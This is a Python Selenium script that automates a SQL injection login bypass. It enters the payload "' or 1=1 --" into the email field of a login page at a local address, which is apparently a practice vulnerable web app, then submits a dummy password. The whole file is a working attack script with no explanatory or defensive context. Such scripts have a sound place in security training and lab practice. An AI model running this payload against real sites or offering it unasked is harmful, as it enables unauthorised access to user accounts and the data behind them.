from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options

# Login URL
login_url = "http://127.0.0.1:42000/#/login"

# SQL injection payload for the email input
payload = "' or 1=1 --"


# Create a new instance of the Firefox driver
driver = webdriver.Firefox()

try:
    # Navigate to the login page
    driver.get(login_url)

    # Wait for the email input field to be present and enter the SQL injection payload
    email_input = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "email"))
    )
    email_input.send_keys(payload)

    # Find the password input field and enter any string
    password_input = driver.find_element(By.ID, "password")
    password_input.send_keys("anything")

    # Find the login button and click it
    login_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
    driver.execute_script("arguments[0].click();", login_button)


except Exception as e:
    print(f"An error occurred: {e}")

